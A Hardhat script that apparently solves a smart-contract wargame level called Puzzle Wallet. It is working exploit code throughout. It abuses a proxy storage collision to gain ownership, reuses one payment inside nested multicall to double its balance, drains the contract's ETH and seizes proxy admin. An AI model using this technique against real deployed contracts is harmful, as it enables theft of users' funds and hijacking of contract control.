const { ethers } = require("hardhat");

async function main() {
  let puzzleProxyAddress = "0xB97Ddb158DF3d0EDCa3ffd2b20F3b24b151F1ea7";
  const myAddress = "0x90F79bf6EB2c4f870365E785982E1f101E93b906";

  const PuzzleProxy = await ethers.getContractFactory("PuzzleProxy");
  const puzzleProxy = await PuzzleProxy.attach(puzzleProxyAddress);

  const PuzzleWallet = await ethers.getContractFactory("PuzzleWallet");
  const puzzleWallet = await PuzzleWallet.attach(puzzleProxyAddress);

  console.log(`PuzzleProxy attached to ${puzzleProxyAddress}`);

  // Start of the hack
  const mySigner = await ethers.getSigner(myAddress);
  console.log("I'm starting the hack");

  // Become owner of the logic contract
  await puzzleProxy.connect(mySigner).proposeNewAdmin(myAddress);
  console.log("I'm the owner of the logic contract");

  // Add yourself to the whitelist
  await puzzleWallet.connect(mySigner).addToWhitelist(myAddress);
  console.log("I'm whitelisted");

  // Trick contract into thinking you deposited 0.002 ETH while you actually deposited 0.001 ETH
  const depositCall = puzzleWallet.interface.encodeFunctionData("deposit");
  const multicallCall = puzzleWallet.interface.encodeFunctionData("multicall", [
    [depositCall],
  ]);
  await puzzleWallet.connect(mySigner).multicall([depositCall, multicallCall], {
    value: ethers.utils.parseEther(".001"),
  });

  console.log("My balance is:", await puzzleWallet.balances(myAddress));
  console.log(
    "The puzzleProxy balance is:",
    await ethers.provider.getBalance(puzzleProxyAddress)
  );

  // Drain the contract balance
  await puzzleWallet
    .connect(mySigner)
    .execute(myAddress, ethers.provider.getBalance(puzzleProxyAddress), "0x");
  console.log("I drained the contract balance");
  console.log(
    "The puzzleProxy balance is:",
    await ethers.provider.getBalance(puzzleProxyAddress)
  );

  // Set maxBalance and hence the admin of PuzzleProxy
  await puzzleWallet.connect(mySigner).setMaxBalance(myAddress);

  // Check if it worked
  console.log("It worked: ", (await puzzleProxy.admin()) === myAddress);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
